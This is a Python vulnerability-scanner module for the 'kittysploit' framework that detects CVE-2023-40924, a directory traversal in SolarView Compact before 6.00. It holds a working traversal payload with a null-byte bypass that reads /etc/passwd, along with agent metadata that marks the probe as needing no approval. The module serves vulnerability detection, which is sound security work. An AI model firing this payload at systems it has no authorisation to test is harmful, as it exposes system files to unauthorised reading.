#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarView Compact before version 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarView Compact < 6.00 - Directory Traversal Detection',
        'description': 'SolarView Compact before version 6.00 is vulnerable to directory traversal via the file parameter in downloader.php. An unauthenticated attacker can read arbitrary files from the system by using path traversal sequences with a null byte bypass to access sensitive files such as /etc/passwd.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'solarview', 'contec', 'traversal', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/Yobing1/CVE-2023-40924/blob/main/README.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-40924',
        ],
        'cve': 'CVE-2023-40924',
    }

    def run(self):
        r = self.http_request(method="GET", path='/downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SolarView Compact < 6.00 - Directory Traversal detected",
                path='/downloader.php?file=../../../../../../../../../../etc/passwd%00.jpg',
            )
            return True
        return False

